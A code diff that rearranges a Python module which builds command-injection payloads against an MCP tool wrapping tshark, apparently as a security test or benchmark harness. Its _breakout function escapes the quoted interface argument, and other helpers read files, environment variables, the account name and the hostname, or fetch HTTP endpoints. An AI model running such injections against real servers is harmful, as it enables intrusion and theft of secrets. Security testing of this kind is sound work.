@@ -65,15 +65,38 @@ KEPT_PLACES: tuple[str, ...] = (
 AIM = re.compile(r'[;"$`|&]')
 
 
+def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
+    async def run(places: Places, client: MCPClientPort) -> None:
+        await _quick_capture(client, _payload_for(places[place_id]))
+
+    return run
+
+
+def _payload_for(place: Place) -> str:
+    kind = place.kind.value
+    if kind == "file":
+        return _shell_read_payload(_file_read_cmd(place))
+    if kind == "env":
+        return _shell_read_payload(f"printenv {place.coordinates.name}")
+    if kind == "account":
+        return _shell_read_payload("id -un")
+    if kind == "hostname":
+        return _shell_read_payload("cat /proc/sys/kernel/hostname")
+    if kind == "http_endpoint":
+        url = f"http://{place.coordinates.host}{place.coordinates.path}"
+        return _http_payload(url)
+    raise ValueError(f"no payload for kind {kind}")
+
+
+def _shell_read_payload(inner_read: str) -> str:
+    return _breakout(f"printf '1\\t%s\\tB\\tC\\n' \"$({inner_read})\"")
+
+
 def _breakout(inner: str) -> str:
     # Break out of `tshark -i "<here>" -c ...` to run `inner`, then swallow the tail with `:`.
     # `inner` carries no double quote (it sits inside the broken-out shell context) and prints one
     # tab-separated line `1\t<nonce>\tB\tC` so the server records src=<nonce>.
     return f'x"; {inner}; : "'
-
-
-def _shell_read_payload(inner_read: str) -> str:
-    return _breakout(f"printf '1\\t%s\\tB\\tC\\n' \"$({inner_read})\"")
 
 
 def _http_payload(url: str) -> str:
@@ -95,33 +118,10 @@ def _file_read_cmd(place: Place) -> str:
     return f"cat {container_path} 2>/dev/null | tr '\\n' ' '"
 
 
-def _payload_for(place: Place) -> str:
-    kind = place.kind.value
-    if kind == "file":
-        return _shell_read_payload(_file_read_cmd(place))
-    if kind == "env":
-        return _shell_read_payload(f"printenv {place.coordinates.name}")
-    if kind == "account":
-        return _shell_read_payload("id -un")
-    if kind == "hostname":
-        return _shell_read_payload("cat /proc/sys/kernel/hostname")
-    if kind == "http_endpoint":
-        url = f"http://{place.coordinates.host}{place.coordinates.path}"
-        return _http_payload(url)
-    raise ValueError(f"no payload for kind {kind}")
-
-
 async def _quick_capture(client: MCPClientPort, interface: str) -> None:
     await client.call_tool(
         "quick_capture", {"interface": interface, "duration": 1, "packet_limit": 1}
     )
-
-
-def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
-    async def run(places: Places, client: MCPClientPort) -> None:
-        await _quick_capture(client, _payload_for(places[place_id]))
-
-    return run
 
 
 async def _benign(places: Places, client: MCPClientPort) -> None:
